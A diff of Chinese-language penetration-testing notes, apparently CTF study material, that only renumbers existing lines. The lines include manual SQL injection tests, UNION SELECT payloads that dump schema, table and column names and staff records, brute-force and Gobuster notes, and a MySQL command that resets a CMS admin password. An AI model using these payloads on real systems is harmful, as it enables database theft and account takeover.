@@ -107,13 +107,13 @@
 2. 手工sql注入
   a. 用 ’ 或者 ’ 1=1 or(and) #(-- ) + ’ 1=2 or(and) #(-- )来判断是否有SQL注入
   b. unionselect语句
-      Order by + 数字
-      若Order by 不成功则从1开始逐个尝试
-      ' union select group_concat(schema_name),2,3,4,5,6 from information_schema.schemata#
-      ' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema="xxx"# - 数据库名
-      ' union select group_concat(table_name),2,3,4,5,6 from xxx.tables where table_schema="yyy"# - 表名
-      ' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name="zzz" - 表的内容
-      ' union select group_concat(具体信息),2,3,4,5,6 from Staff.StaffDetails#
+      1) Order by + 数字
+      2) 若Order by 不成功则从1开始逐个尝试
+      3) ' union select group_concat(schema_name),2,3,4,5,6 from information_schema.schemata#
+      4) ' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema="xxx"# - 数据库名
+      5) ' union select group_concat(table_name),2,3,4,5,6 from xxx.tables where table_schema="yyy"# - 表名
+      6) ' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name="zzz" - 表的内容
+      7) ' union select group_concat(具体信息),2,3,4,5,6 from Staff.StaffDetails#
 
 **爆破**
 1. Burpsuite
@@ -158,7 +158,7 @@
 14. Gobuster vhost 扫描域名。
 
 **Mysql**
-  update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin'; root用户修改密码。
+1. update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin'; root用户修改密码。
 
 
 
